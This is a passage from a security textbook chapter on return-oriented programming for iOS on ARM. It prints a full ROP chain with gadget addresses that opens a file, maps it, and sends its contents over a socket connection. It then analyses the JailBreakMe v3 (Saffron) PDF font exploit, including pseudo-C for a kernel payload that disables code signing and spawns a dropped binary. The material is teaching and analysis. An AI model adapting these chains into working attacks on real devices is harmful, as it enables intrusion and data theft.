238 Chapter 8 n Return-Oriented Programming
// AudioServicesPlaySystemSounds uses LR to return to 0x32988673
// 32988672 bd01 pop {r0, pc}
ropvalues[i++]=0x00000000; // r0
ropvalues[i++]=0x32986a41; // PC
// next chunk executed: set LR
// 32986a40 e8bd4080 pop {r7, lr}
// 32986a44 b001 add sp, #4
// 32986a46 4770 bx lr
ropvalues[i++]=0x12345566; // dummy r7
ropvalues[i++]=0x32988d5f; // LR (thumb mode)
ropvalues[i++]=0x12345687; // padding, skipped over by add sp, #4
// next chunk executed: load R0-R3
// 32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++]=locFilename; // r0 fi lename
ropvalues[i++]=0x00000000; // r1 O_RDONLY
ropvalues[i++]=0x00000000; // dummy r2
ropvalues[i++]=0xddddeeee; // dummy r3
ropvalues[i++]=0x32910d4b; // PC
// next chunk executed: call open
// 32910d4a e840f7b8 blx open
// 32910d4e bd80 pop {r7, pc}
ropvalues[i++] =0x33324444; // r7
ropvalues[i++] =0x32987baf; // PC
//32987bae bd02 pop {r1, pc}
ropvalues[i++] = locFD-8; //r1 points to the FD
ropvalues[i++] = 0x32943b5c; //PC
//32943b5c e5810008 str r0, [r1, #8]
//32943b60 e3a00001 mov r0, #1 ; 0x1
//32943b64 e8bd80f0 ldmia sp!, {r4, r5, r6, r7, pc}
ropvalues[i++] = 0x00000000; //padding
ropvalues[i++] = 0x00000000; // padding
ropvalues[i++] = 0x12345687;
ropvalues[i++] = 0x12345678;
ropvalues[i++] = 0x32986a41; // PC
//32986a40 e8bd4080 pop {r7, lr}
//32986a44 b001 add sp, #4
//32986a46 4770 bx lr
ropvalues[i++]=0x12345566; // r7
ropvalues[i++]=0x32987baf; // LR
ropvalues[i++]=0x12345678; // padding
cc0088..iinndddd 223388 44//1166//22001122 55::4466::4400 PPMM
Chapter 8 n Return-Oriented Programming 239
//32987bae bd02 pop {r1, pc}
ropvalues[i++] =0x33324444; // r7
ropvalues[i++]=0x32988d5f; // PC
//32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++] =0x00000002; // r0 domain
ropvalues[i++] =0x00000001; // r1 type
ropvalues[i++] =0x00000000; // r2 protocol
ropvalues[i++] =0xddddeeee; // r3
ropvalues[i++] =0x328e16dc; // call socket
//socket returns to lr which points to 32987bae
ropvalues[i++] = locSock-8; //r1 points to locSock
ropvalues[i++] = 0x32943b5c; //PC
//32943b5c e5810008 str r0, [r1, #8]
//32943b60 e3a00001 mov r0, #1; 0x1
//32943b64 e8bd80f0 ldmia sp!, {r4, r5, r6, r7, pc}
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x12345687;
ropvalues[i++] = 0x66554422;
ropvalues[i++] = 0x32988d5f; // PC
//32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++] = locSock; // r0 socket
ropvalues[i++] = locSockStruct; // r1 struct
ropvalues[i++] =0x00000010; // r2 struct size
ropvalues[i++] =0xddddeeee; // r3
ropvalues[i++] = 0x328c4ac9; //
//328c4ac8 6800 ldr r0, [r0, #0]
//328c4aca bd80 pop {r7, pc}
ropvalues[i++]= 0x99886655; //garbage r7
ropvalues[i++] = 0x328e9c30; //call connect
//connect returns to lr which points to 32987bae
ropvalues[i++] = 0x00000000; //r1
ropvalues[i++] = 0x32988d5f; // PC
//32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++] = locFilename; // r0, fd
ropvalues[i++] = locStat; // r1, stat structure
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
cc0088..iinndddd 223399 44//1166//22001122 55::4466::4400 PPMM
240 Chapter 8 n Return-Oriented Programming
ropvalues[i++] = 0x328c2a4c; //call stat
//stat returns to lr which points to 32987baf
ropvalues[i++] = 0xabababab; //r1
ropvalues[i++] = 0x328c722c; //PC
//328c722c e8bd8330 ldmia sp!, {r4, r5, r8, r9, pc}
ropvalues[i++] = 0x00000000; //r4 which will be the address for mmap
ropvalues[i++] = 0x00000000; //r5 whatever
ropvalues[i++] = 0x000000000; //r8 is gonna be the fi le len for mmap
ropvalues[i++] = 0x000000002; //r9 MAP_PRIVATE copied in r3
ropvalues[i++] = 0x32988d5f; // PC
//32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++] = locFD - 36;
// r0 will be the fi ledes for mmap
ropvalues[i++] = locStat +60; // r1 struct stat fi le size
ropvalues[i++] = 0x00000001; // r2 PROT_READ
ropvalues[i++] = 0x00000000;
// r3 has to be a valid address, but we don’t care what is it
ropvalues[i++] = 0x32979837;
//32979836 6a43 ldr r3, [r0, #36]
//32979838 6a00 ldr r0, [r0, #32]
//3297983a 4418 add r0, r3
//3297983c bd80 pop {r7, pc}
ropvalues[i++] = sp + 73*4 + 0x10; //r7 whatever
ropvalues[i++] = 0x32988673;
//32988672 bd01 pop {r0, pc}
ropvalues[i++] = sp -28; //r0 has to be a piece of memory
we don’t care about
ropvalues[i++] = 0x329253eb;
//329253ea 6809 ldr r1, [r1, #0]
//329253ec 61c1 str r1, [r0, #28]
//329253ee 2000 movs r0, #0
//329253f0 bd80 pop {r7, pc}
ropvalues[i++] = sp + 75*4 + 0xc; //r7
ropvalues[i++] = 0x328C5CBd;
//328C5CBC STR R3, [SP,#0x24+var_24]
//328C5CBE MOV R3, R9
//328C5CC0 STR R4, [SP,#0x24+var_20]
//328C5CC2 STR R5, [SP,#0x24+var_1C]
//328C5CC4 BLX ___mmap
//328C5CC8 loc_328C5CC8 ; CODE XREF: _mmap+50j
//328C5CC8 SUB.W SP, R7, #0x10
//328C5CCC LDR.W R8, [SP+0x24+var_24],#4
cc0088..iinndddd 224400 44//1166//22001122 55::4466::4400 PPMM
Chapter 8 n Return-Oriented Programming 241
//328C5CD0 POP {R4-R7,PC}
ropvalues[i++] = 0xbbccddee;//we need some padding for the previously
stored stuff on the stack
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x32987baf;
//32987bae bd02 pop {r1, pc}
ropvalues[i++] = locMappedFile -8;
// r1 points to the mapped fi le in-memory
ropvalues[i++] = 0x32943b5c; // PC
//32943b5c e5810008 str r0, [r1, #8]
//32943b60 e3a00001 mov r0, #1 ; 0x1
//32943b64 e8bd80f0 ldmia sp!, {r4, r5, r6, r7, pc}
ropvalues[i++] = sp; //will be overwritten
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x12345687;
ropvalues[i++] = 0x12345678;
ropvalues[i++] = 0x32988d5f; // PC
//32988d5e bd0f pop {r0, r1, r2, r3, pc}
ropvalues[i++] = sp -28; // r0 overwritten when loading r1
ropvalues[i++] = locMappedFile; // r1 whatever
ropvalues[i++] = 0x00000000; // r2 fi lled later
ropvalues[i++] = locStat + 60; // used later to load
stuff into r2
ropvalues[i++] = 0x3298d351;
//3298d350 681a ldr r2, [r3, #0]
//3298d352 6022 str r2, [r4, #0]
//3298d354 601c str r4, [r3, #0]
//3298d356 bdb0 pop {r4, r5, r7, pc}
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x00000000;
ropvalues[i++] = 0x329253eb;
//329253ea 6809 ldr r1, [r1, #0]
//329253ec 61c1 str r1, [r0, #28]
//329253ee 2000 movs r0, #0
//329253f0 bd80 pop {r7, pc}
ropvalues[i++] = 0x11223344;
ropvalues[i++] = 0x32988673
//32988672 bd01 pop {r0, pc}
ropvalues[i++] = locSock;
ropvalues[i++] = 0x328c4ac9;
cc0088..iinndddd 224411 44//1166//22001122 55::4466::4400 PPMM
242 Chapter 8 n Return-Oriented Programming
//328c4ac8 6800 ldr r0, [r0, #0]
//328c4aca bd80 pop {r7, pc}
ropvalues[i++]= 0x88776655; //garbage r7
ropvalues[i++] = 0x32986a41; // PC
//32986a40 e8bd4080 pop {r7, lr}
//32986a44 b001 add sp, #4
//32986a46 4770 bx lr
ropvalues[i++]=0x12345566; // r7
ropvalues[i++]=0x3298d3ab; // LR
ropvalues[i++]=0x12345678; // padding
//3298d3aa bd00 pop {pc}
ropvalues[i++] = 0x328e456c; // call write
// write returns to lr which points to 0x3298d3ab
ropvalues[i++] = 0x32988673;
// 32988672 bd01 pop {r0, pc}
ropvalues[i++] = 0x00000001;
ropvalues[i++] = 0x328fa335; //call sleep();
// sleep returns to lr which points to 0x3298d3ab
ropvalues[i++] = 0x32988673;
// 32988672 bd01 pop {r0, pc}
ropvalues[i++] = locFD; // r0 fd
ropvalues[i++] = 0x328c4ac9;//
//328c4ac8 6800 ldr r0, [r0, #0]
//328c4aca bd80 pop {r7, pc}
ropvalues[i++] = 0xccccdddd;
ropvalues[i++] = 0x328c8d74; //call close()
// close returns to lr which points to 0x3298d3ab
ropvalues[i++] = 0x328e469d; // call exit()
Using ROP to Chain Two Exploits (JailBreakMe v3)
As briefl y shown in Chapter 7, the JailBreakMe v3 exploit (also known as Saffron)
by comex is one of the most impressive exploits publicly available for iOS. We do
not go into the details of the exploit itself, but to understand the ROP payload,
there is one important detail to take into account.
From iOS 4.3 on, Apple has introduced ASLR, Address space layout random-
ization; therefore, any exploit willing to use ROP needs to discover the base
address of a module. Saffron uses an information leak to determine the base
address of the dyld_shared_cache, where all libraries are stored. Once the base
address is leaked, Saffron relocates the entire ROP payload accordingly.
Saffron exploits a vulnerability in the PDF reader. Therefore, the entire
payload is written using the T1 language. The font fi le contains several routines.
cc0088..iinndddd 224422 44//1166//22001122 55::4466::4400 PPMM
Chapter 8 n Return-Oriented Programming 243
Some of them are particularly useful to understand how the ROP payload
works.
You can fi nd a detailed explanation of the exploit at http://esec-lab.sogeti
.com/post/Analysis-of-the-jailbreakme-v3-font-exploit. Here we focus on
the components that are of interest for the subject. The two routines responsible
for writing the payload to memory are routine 8 and routine 9, depending on
the iPhone model. A number of auxiliary routines are used:
n Routines 4, 5, and 7 push values onto the stack, taking into consideration
the ASLR slide.
n Routine 6 pushes a dword added to a stack offset obtained in the exploi-
tation phase.
n Routines 20 and 21 add or subtract values pushed onto the stack.
n Routine 24 saves a value pushed onto the stack to an attacker-controlled
location.
n Routine 25 pushes onto the stack an address stored in an attacker-controlled
location.
With this information in mind, it is now possible to explain what the shellcode
does. The ROP payload in userland roughly performs the following operation
in pseudo-C:
mach_port_t self = mach_task_self();
mlock(addr, 0x4a0);
match = IOServiceMatching(“AppleRGBOUT”);
IOKitWaitQuiet(0, 0);
amatch = IOServiceGetMatchingService(0, match);
IOServiceOpen(amatch, self, 0, &connect);
IOConnectCallScalarMethod(connect, 21, callback, 2, 0, 0);
IOConnectCallStructMethod(connect, 5, kpayload, 0xd8, 0, 0);
IOServiceClose(connect);
munlock(addr, 0x4a0);
void *locutusptr = malloc(0x8590);
zlib.uncompress(locutusptr, 0x8590, locutussource,0x30eb);
fd = open(“/tmp/locutus”, O_WRONLY | O_CREAT | O_TRUNC, 0755);
write(fd, locutusptr, 0x8590);
close(fd);
posix_spawn(0, “/tmp/locutus”, 0, 0, NULL, NULL);
//this will resume the execution r0 = 1337;
sp = crafted_offset;
What this code does fi rst is map a ROP kernel-land shellcode (kpayload) at a
specifi c address. Afterward, it locates the AppleRGBOUT IOKit service and trig-
gers the vulnerability in the module with the two IOConnectCall functions. At
this point the kernel shellcode is executed. This shellcode is again ROP, and it
will disable a number of protections, including code signing, so that later on
cc0088..iinndddd 224433 44//1166//22001122 55::4466::4400 PPMM
244 Chapter 8 n Return-Oriented Programming
when the execution goes back to userland, the locutus application can run. In
fact, the shellcode then continues by unmapping the shellcode, decompressing
the locutus binary, writing it to a fi le, and spawning it.
Finally, to avoid crashing MobileSafari, the execution is restored by carefully
setting the stack pointer to a safe location and R0 to a value that represents the
return value of the vulnerable function.
Analyzing the entire ROP payload would take an entire chapter for its size
and complexity. Therefore, we focus only on some specifi c gadgets and recur-
ring patterns in it.
First of all, the entire payload is written using Python code that wraps the
necessary gadgets. Therefore, there is a high density of repetitive instructions
in the resulting shellcode. Without a doubt, the most used and interesting one
is the gadget used to call a function. The following gadgets correspond to this
C function call, which is used quite frequently in the payload for debugging
purposes:
char *str;
fprintf(stderr, “Result for %s was %08x\n”, str);
//it starts with a pop{r4, r7, pc}
0x1e79c //r4, this is an address that will be adjusted with the infoleak
0x0 //r7
0x3002b379 //pc, this does: ldr r0, [r0, #0] pop{r7, pc}
0x0 //r7
0x32882613 //pc, this does: str r0, [r4, #0] pop{r4, pc}
0x1e4c4 //r4, this address will be adjusted with the infoleak
0x32882613 //pc, this does: str r0, [r4, #0] pop{r4, pc}
0x32c928fd //r4, address of fprintf
0x30fb7538 //pc, this does: pop {r0, r1, r2, r3, pc}
0x3e810084 //r0, address of ___stderrp
0x1eec8 //r1, address adjusted with the infoleak
0x1eee0 //r2, address adjusted with the infoleak
0x0 //r3
0x3002b379 //pc, this does: ldr r0, [r0, #0] pop{r7, pc}